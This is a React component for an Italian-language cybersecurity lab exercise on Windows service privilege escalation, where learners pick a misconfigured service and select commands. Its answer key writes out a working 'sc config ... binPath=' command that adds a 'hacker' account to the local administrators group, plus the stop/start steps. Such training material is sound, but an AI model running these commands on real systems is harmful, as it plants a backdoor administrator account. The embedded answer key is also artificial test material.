import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { InfoNote, SuccessNote, WarnNote } from "@/components/lab/Feedback";
import { cn } from "@/lib/utils";
import type { TaskContext } from "../../types";

type Svc = { name: string; path: string; runAs: string; acl: string; vuln: boolean; why: string };

const SERVICES: Svc[] = [
  { name: "wuauserv", path: "C:\\Windows\\System32\\svchost.exe -k netsvcs", runAs: "LocalSystem", acl: "Administrators: Full  |  Users: Read", vuln: false, why: "ACL corretta: gli utenti non possono modificare la configurazione." },
  { name: "VulnSvc", path: "C:\\Program Files\\VulnSvc\\svc.exe", runAs: "LocalSystem", acl: "BUILTIN\\Users: FullControl  ← anomalo", vuln: true, why: "Gli utenti possono cambiare BINARY_PATH_NAME: privesc immediata." },
  { name: "Spooler", path: "C:\\Windows\\System32\\spoolsv.exe", runAs: "LocalSystem", acl: "Administrators: Full  |  Users: Read", vuln: false, why: "Configurazione standard." },
];

const CMDS = [
  { id: "c1", text: "sc config VulnSvc binPath= \"cmd.exe /c net user hacker Pass123! /add & net localgroup administrators hacker /add\"", ok: true },
  { id: "c2", text: "sc stop VulnSvc", ok: true },
  { id: "c3", text: "sc start VulnSvc", ok: true },
  { id: "c4", text: "sc delete VulnSvc", ok: false },
  { id: "c5", text: "net user hacker /del", ok: false },
];

export default function Task04Services(ctx: { markComplete: () => void; isComplete: boolean }) {
  const [svc, setSvc] = useState<string | null>(null);
  const [cmds, setCmds] = useState<Set<string>>(new Set());
  const [checked, setChecked] = useState(false);
  const svcOk = svc === "VulnSvc";
  const cmdsOk = [...cmds].every((id) => CMDS.find((c) => c.id === id)?.ok) && CMDS.filter((c) => c.ok).every((c) => cmds.has(c.id));
  const correct = svcOk && cmdsOk;
  useEffect(() => { if (checked && correct) ctx.markComplete(); }, [checked, correct, ctx]);

  return (
    <div>
      <div className="min-w-0 rounded-xl border border-border bg-surface p-4">
        <div className="mb-2 font-mono text-xs uppercase tracking-widest text-muted-foreground">1. Scegli il servizio sfruttabile</div>
        <div className="grid gap-2 md:grid-cols-3">
          {SERVICES.map((s) => (
            <button key={s.name} onClick={() => { setSvc(s.name); setChecked(false); }} className={cn("min-w-0 rounded-md border p-3 text-left text-sm transition", svc === s.name ? "border-accent bg-accent/10" : "border-border bg-background hover:border-accent/50")}>
              <div className="font-mono text-foreground">{s.name}</div>
              <div className="mt-1 break-all text-[11px] text-muted-foreground">{s.path}</div>
              <div className="mt-1 text-[11px] text-muted-foreground">RunAs: {s.runAs}</div>
              <div className={cn("mt-1 break-all text-[11px]", s.vuln ? "text-destructive" : "text-muted-foreground")}>{s.acl}</div>
            </button>
          ))}
        </div>
      </div>

      <div className="mt-4 min-w-0 rounded-xl border border-border bg-surface p-4">
        <div className="mb-2 font-mono text-xs uppercase tracking-widest text-muted-foreground">2. Seleziona i comandi da eseguire (in cmd elevato-non-elevato, come utente)</div>
        <div className="space-y-2">
          {CMDS.map((c) => (
            <label key={c.id} className={cn("flex min-w-0 cursor-pointer items-start gap-2 rounded-md border p-2 font-mono text-[12px]", cmds.has(c.id) ? "border-accent bg-accent/10" : "border-border bg-background hover:border-accent/50")}>
              <input type="checkbox" className="mt-1" checked={cmds.has(c.id)} onChange={() => { setChecked(false); setCmds((p) => { const n = new Set(p); n.has(c.id) ? n.delete(c.id) : n.add(c.id); return n; }); }} />
              <span className="min-w-0 break-all [overflow-wrap:anywhere] text-foreground">{c.text}</span>
            </label>
          ))}
        </div>
      </div>

      <Button className="mt-4 w-full" onClick={() => setChecked(true)}>Verifica scelta e comandi</Button>

      {!checked && <InfoNote>Cerca chi ha «BUILTIN\Users: FullControl» sull'ACL. Poi: riconfigura, ferma, riavvia.</InfoNote>}
      {checked && !correct && <WarnNote>Non ancora. Servizio giusto: quello con ACL anomala. Comandi giusti: sc config + sc stop + sc start.</WarnNote>}
      {ctx.isComplete && <SuccessNote>Al prossimo start di VulnSvc, Windows esegue il tuo binPath come SYSTEM: utente «hacker» aggiunto agli amministratori.</SuccessNote>}
    </div>
  );
}
